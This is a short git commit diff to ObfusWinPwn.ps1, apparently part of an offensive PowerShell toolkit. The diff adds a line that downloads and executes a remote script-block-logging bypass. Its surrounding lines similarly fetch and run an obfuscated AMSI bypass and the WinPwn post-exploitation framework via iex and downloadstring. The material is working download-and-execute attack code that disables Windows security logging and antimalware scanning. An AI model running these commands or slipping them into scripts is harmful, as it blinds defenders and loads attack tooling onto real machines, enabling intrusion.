55b1dbf1e463880906bf5ca02f2c3ff87cdc5412
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2020-01-27 15:40:33 +0100

    Update ObfusWinPwn.ps1

--- ObfusWinPwn.ps1
+++ ObfusWinPwn.ps1
@@ -8,5 +8,6 @@ If (-Not $string)
   iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/obfamsi.ps1')
   ShEEt
 }
+iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/scriptblocklog.ps1')
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
 WinPwn
